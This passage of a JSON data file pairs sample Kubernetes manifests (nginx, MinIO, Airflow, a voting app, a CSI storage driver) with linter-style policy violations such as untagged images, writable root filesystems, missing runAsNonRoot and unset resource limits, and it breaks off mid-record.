    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7290\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "04106",
    "manifest_path": "data/manifests/the_stack_sample/sample_1864.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7290\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "04107",
    "manifest_path": "data/manifests/the_stack_sample/sample_1864.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7290\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "04108",
    "manifest_path": "data/manifests/the_stack_sample/sample_1864.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7290\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "04109",
    "manifest_path": "data/manifests/the_stack_sample/sample_1864.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7290\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "04110",
    "manifest_path": "data/manifests/the_stack_sample/sample_1865.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: example-minio-data\nspec:\n  template:\n    spec:\n      containers:\n      - name: minio-client\n        image: minio/mc\n        command:\n        - /bin/sh\n        - -c\n        - 'sleep 100 && mc config host add minio-service http://minio-service:9000\n          minio minio123 && mc mb minio-service/my-bucket && echo ''hello'' > file1.txt\n          && echo ''world'' > file2.txt && mc cp *.txt minio-service/my-bucket '\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"minio-client\" is using an invalid container image, \"minio/mc\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "04111",
    "manifest_path": "data/manifests/the_stack_sample/sample_1865.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: example-minio-data\nspec:\n  template:\n    spec:\n      containers:\n      - name: minio-client\n        image: minio/mc\n        command:\n        - /bin/sh\n        - -c\n        - 'sleep 100 && mc config host add minio-service http://minio-service:9000\n          minio minio123 && mc mb minio-service/my-bucket && echo ''hello'' > file1.txt\n          && echo ''world'' > file2.txt && mc cp *.txt minio-service/my-bucket '\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"minio-client\" does not have a read-only root file system"
  },
  {
    "id": "04112",
    "manifest_path": "data/manifests/the_stack_sample/sample_1865.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: example-minio-data\nspec:\n  template:\n    spec:\n      containers:\n      - name: minio-client\n        image: minio/mc\n        command:\n        - /bin/sh\n        - -c\n        - 'sleep 100 && mc config host add minio-service http://minio-service:9000\n          minio minio123 && mc mb minio-service/my-bucket && echo ''hello'' > file1.txt\n          && echo ''world'' > file2.txt && mc cp *.txt minio-service/my-bucket '\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"minio-client\" is not set to runAsNonRoot"
  },
  {
    "id": "04113",
    "manifest_path": "data/manifests/the_stack_sample/sample_1865.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: example-minio-data\nspec:\n  template:\n    spec:\n      containers:\n      - name: minio-client\n        image: minio/mc\n        command:\n        - /bin/sh\n        - -c\n        - 'sleep 100 && mc config host add minio-service http://minio-service:9000\n          minio minio123 && mc mb minio-service/my-bucket && echo ''hello'' > file1.txt\n          && echo ''world'' > file2.txt && mc cp *.txt minio-service/my-bucket '\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"minio-client\" has cpu request 0"
  },
  {
    "id": "04114",
    "manifest_path": "data/manifests/the_stack_sample/sample_1865.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: example-minio-data\nspec:\n  template:\n    spec:\n      containers:\n      - name: minio-client\n        image: minio/mc\n        command:\n        - /bin/sh\n        - -c\n        - 'sleep 100 && mc config host add minio-service http://minio-service:9000\n          minio minio123 && mc mb minio-service/my-bucket && echo ''hello'' > file1.txt\n          && echo ''world'' > file2.txt && mc cp *.txt minio-service/my-bucket '\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"minio-client\" has memory limit 0"
  },
  {
    "id": "04115",
    "manifest_path": "data/manifests/the_stack_sample/sample_1866.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dummy-name\nspec:\n  containers:\n  - env:\n    - name: AIRFLOW__CORE__EXECUTOR\n      value: LocalExecutor\n    - name: AIRFLOW__CORE__FERNET_KEY\n      valueFrom:\n        secretKeyRef:\n          name: RELEASE-NAME-fernet-key\n          key: fernet-key\n    - name: AIRFLOW__DATABASE__SQL_ALCHEMY_CONN\n      valueFrom:\n        secretKeyRef:\n          name: RELEASE-NAME-airflow-metadata\n          key: connection\n    - name: AIRFLOW_CONN_AIRFLOW_DB\n      valueFrom:\n        secretKeyRef:\n          name: RELEASE-NAME-airflow-metadata\n          key: connection\n    image: dummy_image\n    imagePullPolicy: IfNotPresent\n    name: base\n    volumeMounts:\n    - mountPath: /opt/airflow/logs\n      name: airflow-logs\n    - mountPath: /opt/airflow/airflow.cfg\n      name: airflow-config\n      readOnly: true\n      subPath: airflow.cfg\n  securityContext:\n    runAsUser: 50000\n    fsGroup: 50000\n  serviceAccountName: RELEASE-NAME-worker-serviceaccount\n  volumes:\n  - emptyDir: {}\n    name: airflow-logs\n  - configMap:\n      name: RELEASE-NAME-airflow-config\n    name: airflow-config\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"base\" is using an invalid container image, \"dummy_image\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "04116",
    "manifest_path": "data/manifests/the_stack_sample/sample_1866.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dummy-name\nspec:\n  containers:\n  - env:\n    - name: AIRFLOW__CORE__EXECUTOR\n      value: LocalExecutor\n    - name: AIRFLOW__CORE__FERNET_KEY\n      valueFrom:\n        secretKeyRef:\n          name: RELEASE-NAME-fernet-key\n          key: fernet-key\n    - name: AIRFLOW__DATABASE__SQL_ALCHEMY_CONN\n      valueFrom:\n        secretKeyRef:\n          name: RELEASE-NAME-airflow-metadata\n          key: connection\n    - name: AIRFLOW_CONN_AIRFLOW_DB\n      valueFrom:\n        secretKeyRef:\n          name: RELEASE-NAME-airflow-metadata\n          key: connection\n    image: dummy_image\n    imagePullPolicy: IfNotPresent\n    name: base\n    volumeMounts:\n    - mountPath: /opt/airflow/logs\n      name: airflow-logs\n    - mountPath: /opt/airflow/airflow.cfg\n      name: airflow-config\n      readOnly: true\n      subPath: airflow.cfg\n  securityContext:\n    runAsUser: 50000\n    fsGroup: 50000\n  serviceAccountName: RELEASE-NAME-worker-serviceaccount\n  volumes:\n  - emptyDir: {}\n    name: airflow-logs\n  - configMap:\n      name: RELEASE-NAME-airflow-config\n    name: airflow-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"base\" does not have a read-only root file system"
  },
  {
    "id": "04117",
    "manifest_path": "data/manifests/the_stack_sample/sample_1866.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dummy-name\nspec:\n  containers:\n  - env:\n    - name: AIRFLOW__CORE__EXECUTOR\n      value: LocalExecutor\n    - name: AIRFLOW__CORE__FERNET_KEY\n      valueFrom:\n        secretKeyRef:\n          name: RELEASE-NAME-fernet-key\n          key: fernet-key\n    - name: AIRFLOW__DATABASE__SQL_ALCHEMY_CONN\n      valueFrom:\n        secretKeyRef:\n          name: RELEASE-NAME-airflow-metadata\n          key: connection\n    - name: AIRFLOW_CONN_AIRFLOW_DB\n      valueFrom:\n        secretKeyRef:\n          name: RELEASE-NAME-airflow-metadata\n          key: connection\n    image: dummy_image\n    imagePullPolicy: IfNotPresent\n    name: base\n    volumeMounts:\n    - mountPath: /opt/airflow/logs\n      name: airflow-logs\n    - mountPath: /opt/airflow/airflow.cfg\n      name: airflow-config\n      readOnly: true\n      subPath: airflow.cfg\n  securityContext:\n    runAsUser: 50000\n    fsGroup: 50000\n  serviceAccountName: RELEASE-NAME-worker-serviceaccount\n  volumes:\n  - emptyDir: {}\n    name: airflow-logs\n  - configMap:\n      name: RELEASE-NAME-airflow-config\n    name: airflow-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"base\" has cpu request 0"
  },
  {
    "id": "04118",
    "manifest_path": "data/manifests/the_stack_sample/sample_1866.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dummy-name\nspec:\n  containers:\n  - env:\n    - name: AIRFLOW__CORE__EXECUTOR\n      value: LocalExecutor\n    - name: AIRFLOW__CORE__FERNET_KEY\n      valueFrom:\n        secretKeyRef:\n          name: RELEASE-NAME-fernet-key\n          key: fernet-key\n    - name: AIRFLOW__DATABASE__SQL_ALCHEMY_CONN\n      valueFrom:\n        secretKeyRef:\n          name: RELEASE-NAME-airflow-metadata\n          key: connection\n    - name: AIRFLOW_CONN_AIRFLOW_DB\n      valueFrom:\n        secretKeyRef:\n          name: RELEASE-NAME-airflow-metadata\n          key: connection\n    image: dummy_image\n    imagePullPolicy: IfNotPresent\n    name: base\n    volumeMounts:\n    - mountPath: /opt/airflow/logs\n      name: airflow-logs\n    - mountPath: /opt/airflow/airflow.cfg\n      name: airflow-config\n      readOnly: true\n      subPath: airflow.cfg\n  securityContext:\n    runAsUser: 50000\n    fsGroup: 50000\n  serviceAccountName: RELEASE-NAME-worker-serviceaccount\n  volumes:\n  - emptyDir: {}\n    name: airflow-logs\n  - configMap:\n      name: RELEASE-NAME-airflow-config\n    name: airflow-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"base\" has memory limit 0"
  },
  {
    "id": "04119",
    "manifest_path": "data/manifests/the_stack_sample/sample_1868.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vote\n  labels:\n    app: vote\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: vote\n      env: dev\n  template:\n    metadata:\n      labels:\n        app: vote\n        env: dev\n    spec:\n      containers:\n      - name: vote\n        image: dockersamples/examplevotingapp_vote:before\n        ports:\n        - containerPort: 80\n          name: vote\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"vote\" does not have a read-only root file system"
  },
  {
    "id": "04120",
    "manifest_path": "data/manifests/the_stack_sample/sample_1868.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vote\n  labels:\n    app: vote\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: vote\n      env: dev\n  template:\n    metadata:\n      labels:\n        app: vote\n        env: dev\n    spec:\n      containers:\n      - name: vote\n        image: dockersamples/examplevotingapp_vote:before\n        ports:\n        - containerPort: 80\n          name: vote\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"vote\" is not set to runAsNonRoot"
  },
  {
    "id": "04121",
    "manifest_path": "data/manifests/the_stack_sample/sample_1868.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vote\n  labels:\n    app: vote\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: vote\n      env: dev\n  template:\n    metadata:\n      labels:\n        app: vote\n        env: dev\n    spec:\n      containers:\n      - name: vote\n        image: dockersamples/examplevotingapp_vote:before\n        ports:\n        - containerPort: 80\n          name: vote\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"vote\" has cpu request 0"
  },
  {
    "id": "04122",
    "manifest_path": "data/manifests/the_stack_sample/sample_1868.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vote\n  labels:\n    app: vote\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: vote\n      env: dev\n  template:\n    metadata:\n      labels:\n        app: vote\n        env: dev\n    spec:\n      containers:\n      - name: vote\n        image: dockersamples/examplevotingapp_vote:before\n        ports:\n        - containerPort: 80\n          name: vote\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"vote\" has memory limit 0"
  },
  {
    "id": "04123",
    "manifest_path": "data/manifests/the_stack_sample/sample_1870.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6441\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "04124",
    "manifest_path": "data/manifests/the_stack_sample/sample_1870.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6441\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "04125",
    "manifest_path": "data/manifests/the_stack_sample/sample_1870.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6441\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "04126",
    "manifest_path": "data/manifests/the_stack_sample/sample_1870.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6441\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "04127",
    "manifest_path": "data/manifests/the_stack_sample/sample_1870.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6441\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "04128",
    "manifest_path": "data/manifests/the_stack_sample/sample_1872.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: org2-install-k8s-builder\nspec:\n  template:\n    metadata:\n      name: org2-install-k8s-builder\n    spec:\n      containers:\n      - name: main\n        image: ghcr.io/hyperledgendary/k8s-fabric-peer:${K8S_CHAINCODE_BUILDER_VERSION}\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - mkdir -p /mnt/fabric-org2/fabric/external_builders && cp -rv /opt/hyperledger/k8s_builder\n          /mnt/fabric-org2/fabric/external_builders/\n        volumeMounts:\n        - name: fabric-org2-volume\n          mountPath: /mnt/fabric-org2\n      volumes:\n      - name: fabric-org2-volume\n        persistentVolumeClaim:\n          claimName: fabric-org2\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"main\" does not have a read-only root file system"
  },
  {
    "id": "04129",
    "manifest_path": "data/manifests/the_stack_sample/sample_1872.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: org2-install-k8s-builder\nspec:\n  template:\n    metadata:\n      name: org2-install-k8s-builder\n    spec:\n      containers:\n      - name: main\n        image: ghcr.io/hyperledgendary/k8s-fabric-peer:${K8S_CHAINCODE_BUILDER_VERSION}\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - mkdir -p /mnt/fabric-org2/fabric/external_builders && cp -rv /opt/hyperledger/k8s_builder\n          /mnt/fabric-org2/fabric/external_builders/\n        volumeMounts:\n        - name: fabric-org2-volume\n          mountPath: /mnt/fabric-org2\n      volumes:\n      - name: fabric-org2-volume\n        persistentVolumeClaim:\n          claimName: fabric-org2\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"main\" is not set to runAsNonRoot"
  },
  {
    "id": "04130",
    "manifest_path": "data/manifests/the_stack_sample/sample_1872.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: org2-install-k8s-builder\nspec:\n  template:\n    metadata:\n      name: org2-install-k8s-builder\n    spec:\n      containers:\n      - name: main\n        image: ghcr.io/hyperledgendary/k8s-fabric-peer:${K8S_CHAINCODE_BUILDER_VERSION}\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - mkdir -p /mnt/fabric-org2/fabric/external_builders && cp -rv /opt/hyperledger/k8s_builder\n          /mnt/fabric-org2/fabric/external_builders/\n        volumeMounts:\n        - name: fabric-org2-volume\n          mountPath: /mnt/fabric-org2\n      volumes:\n      - name: fabric-org2-volume\n        persistentVolumeClaim:\n          claimName: fabric-org2\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"main\" has cpu request 0"
  },
  {
    "id": "04131",
    "manifest_path": "data/manifests/the_stack_sample/sample_1872.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: org2-install-k8s-builder\nspec:\n  template:\n    metadata:\n      name: org2-install-k8s-builder\n    spec:\n      containers:\n      - name: main\n        image: ghcr.io/hyperledgendary/k8s-fabric-peer:${K8S_CHAINCODE_BUILDER_VERSION}\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - mkdir -p /mnt/fabric-org2/fabric/external_builders && cp -rv /opt/hyperledger/k8s_builder\n          /mnt/fabric-org2/fabric/external_builders/\n        volumeMounts:\n        - name: fabric-org2-volume\n          mountPath: /mnt/fabric-org2\n      volumes:\n      - name: fabric-org2-volume\n        persistentVolumeClaim:\n          claimName: fabric-org2\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"main\" has memory limit 0"
  },
  {
    "id": "04132",
    "manifest_path": "data/manifests/the_stack_sample/sample_1879.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: k3s-cluster-doc\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: k3s-cluster-docs\n  template:\n    metadata:\n      labels:\n        app: k3s-cluster-docs\n    spec:\n      containers:\n      - name: server\n        image: k3s-cluster-docs\n        ports:\n        - containerPort: 80\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"server\" is using an invalid container image, \"k3s-cluster-docs\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "04133",
    "manifest_path": "data/manifests/the_stack_sample/sample_1879.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: k3s-cluster-doc\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: k3s-cluster-docs\n  template:\n    metadata:\n      labels:\n        app: k3s-cluster-docs\n    spec:\n      containers:\n      - name: server\n        image: k3s-cluster-docs\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "04134",
    "manifest_path": "data/manifests/the_stack_sample/sample_1879.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: k3s-cluster-doc\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: k3s-cluster-docs\n  template:\n    metadata:\n      labels:\n        app: k3s-cluster-docs\n    spec:\n      containers:\n      - name: server\n        image: k3s-cluster-docs\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "04135",
    "manifest_path": "data/manifests/the_stack_sample/sample_1879.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: k3s-cluster-doc\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: k3s-cluster-docs\n  template:\n    metadata:\n      labels:\n        app: k3s-cluster-docs\n    spec:\n      containers:\n      - name: server\n        image: k3s-cluster-docs\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"server\" has cpu request 0"
  },
  {
    "id": "04136",
    "manifest_path": "data/manifests/the_stack_sample/sample_1879.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: k3s-cluster-doc\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: k3s-cluster-docs\n  template:\n    metadata:\n      labels:\n        app: k3s-cluster-docs\n    spec:\n      containers:\n      - name: server\n        image: k3s-cluster-docs\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"server\" has memory limit 0"
  },
  {
    "id": "04137",
    "manifest_path": "data/manifests/the_stack_sample/sample_1880.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6664\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "04138",
    "manifest_path": "data/manifests/the_stack_sample/sample_1880.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6664\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "04139",
    "manifest_path": "data/manifests/the_stack_sample/sample_1880.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6664\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "04140",
    "manifest_path": "data/manifests/the_stack_sample/sample_1880.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6664\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "04141",
    "manifest_path": "data/manifests/the_stack_sample/sample_1880.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6664\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "04142",
    "manifest_path": "data/manifests/the_stack_sample/sample_1884.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-sfs-turbo-controller\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-sfs-turbo-controller\n  template:\n    metadata:\n      labels:\n        app: csi-sfs-turbo-controller\n    spec:\n      serviceAccountName: csi-sfs-turbo-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: quay.io/k8scsi/csi-provisioner:v1.4.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        - --enable-leader-election\n        - --leader-election-type=leases\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: csi-attacher\n        image: quay.io/k8scsi/csi-attacher:v3.1.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: sfs-turbo-csi-plugin\n        image: registry.eu-west-0.prod-cloud-ocb.orange-business.com/official/sfsturbo-csi-plugin:v1.8\n        args:\n        - --v=2\n        - --logtostderr\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(NODE_ID)\n        - --cloud-config=$(CLOUD_CONFIG)\n        ports:\n        - containerPort: 28888\n          name: healthz\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: NODE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CSI_ENDPOINT\n          value: unix://csi/csi.sock\n        - name: CLOUD_CONFIG\n          value: /etc/sfs-turbo/cloud-config\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/sfs-turbo/\n          name: sfs-turbo-config\n      - name: liveness-probe\n        imagePullPolicy: Always\n        image: quay.io/k8scsi/livenessprobe:v1.1.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --connection-timeout=3s\n        - --health-port=28888\n        - --v=5\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: sfs-turbo-config\n        hostPath:\n          path: /etc/sfs-turbo/\n          type: Directory\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-attacher\" does not have a read-only root file system"
  },
  {
    "id": "04143",
    "manifest_path": "data/manifests/the_stack_sample/sample_1884.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-sfs-turbo-controller\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-sfs-turbo-controller\n  template:\n    metadata:\n      labels:\n        app: csi-sfs-turbo-controller\n    spec:\n      serviceAccountName: csi-sfs-turbo-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: quay.io/k8scsi/csi-provisioner:v1.4.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        - --enable-leader-election\n        - --leader-election-type=leases\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: csi-attacher\n        image: quay.io/k8scsi/csi-attacher:v3.1.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: sfs-turbo-csi-plugin\n        image: registry.eu-west-0.prod-cloud-ocb.orange-business.com/official/sfsturbo-csi-plugin:v1.8\n        args:\n        - --v=2\n        - --logtostderr\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(NODE_ID)\n        - --cloud-config=$(CLOUD_CONFIG)\n        ports:\n        - containerPort: 28888\n          name: healthz\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: NODE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CSI_ENDPOINT\n          value: unix://csi/csi.sock\n        - name: CLOUD_CONFIG\n          value: /etc/sfs-turbo/cloud-config\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/sfs-turbo/\n          name: sfs-turbo-config\n      - name: liveness-probe\n        imagePullPolicy: Always\n        image: quay.io/k8scsi/livenessprobe:v1.1.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --connection-timeout=3s\n        - --health-port=28888\n        - --v=5\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: sfs-turbo-config\n        hostPath:\n          path: /etc/sfs-turbo/\n          type: Directory\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-provisioner\" does not have a read-only root file system"
  },
  {
    "id": "04144",
    "manifest_path": "data/manifests/the_stack_sample/sample_1884.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-sfs-turbo-controller\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-sfs-turbo-controller\n  template:\n    metadata:\n      labels:\n        app: csi-sfs-turbo-controller\n    spec:\n      serviceAccountName: csi-sfs-turbo-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: quay.io/k8scsi/csi-provisioner:v1.4.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        - --enable-leader-election\n        - --leader-election-type=leases\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: csi-attacher\n        image: quay.io/k8scsi/csi-attacher:v3.1.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: sfs-turbo-csi-plugin\n        image: registry.eu-west-0.prod-cloud-ocb.orange-business.com/official/sfsturbo-csi-plugin:v1.8\n        args:\n        - --v=2\n        - --logtostderr\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(NODE_ID)\n        - --cloud-config=$(CLOUD_CONFIG)\n        